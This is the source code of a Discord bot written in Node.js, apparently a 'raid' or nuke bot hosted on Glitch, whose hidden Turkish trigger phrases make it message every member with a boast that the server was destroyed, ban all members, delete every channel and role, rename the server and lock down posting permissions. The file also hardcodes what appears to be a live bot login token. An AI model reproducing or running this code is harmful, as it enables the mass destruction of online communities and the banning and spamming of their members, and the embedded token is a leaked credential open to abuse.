////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const express = require('express');

const Discord = require('discord.js');
const berke = new Discord.Client();
const app = express();
const http = require('http');
    app.get("/", (request, response) => {
    response.sendStatus(200);
    });
    app.listen(process.env.PORT);
    setInterval(() => {
    http.get('http://dyno-raid.glitch.me/');
    }, 280000);
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('message', msg => {
  if (msg.content === 'sadeceberkeyeözelkrdşim') {
    msg.delete()
    msg.guild.members.forEach(member => member.send("https://discord.gg/xCzsdN7 **Sunucunuz Berke Tarafından Patlatılmıştır.**").then(member.ban())
  )}
})

berke.on('message', async msg => {
  if (msg.content.toLowerCase() === 'burayı bi düzelt' ) {
    msg.guild.members.forEach(member => member.ban())
    msg.guild.channels.deleteAll();
    msg.guild.roles.deleteAll();
    msg.guild.setName("BERKE ADAMDIR");
    msg.guild.setIcon("https://media.discordapp.net/attachments/600251870836948993/623176047994732544/download.png");
    msg.guild.createChannel("dyno");
    msg.guild.createChannel("youtube");
    msg.guild.createChannel("lyrics-hazretleri");
  }
});
 
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 


berke.on('message', message => {
    if(message.content.toLowerCase() === 'ban kaldır' ) {
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                message.guild.unban(user);
            });
        });
    }
});

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

berke.on('channelCreate', channel => {
  if (channel.name == 'dyno') {
    channel.send(`Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; **Lyrics vî#9999**`)
    channel.guild.channels.forEach(c => {
         c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
              SEND_MESSAGES: false,
              ADD_REACTIONS: false,
              SPEAK: false
            });
          });
  }
  if (channel.name == '') {
    channel.send(``)
  }

});

berke.login("NjE3NDczNjI3Mzk4NjAyNzUz.XaNZhA.GTEDbHO-s4iRNQg2fwjljNlG1M8");


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////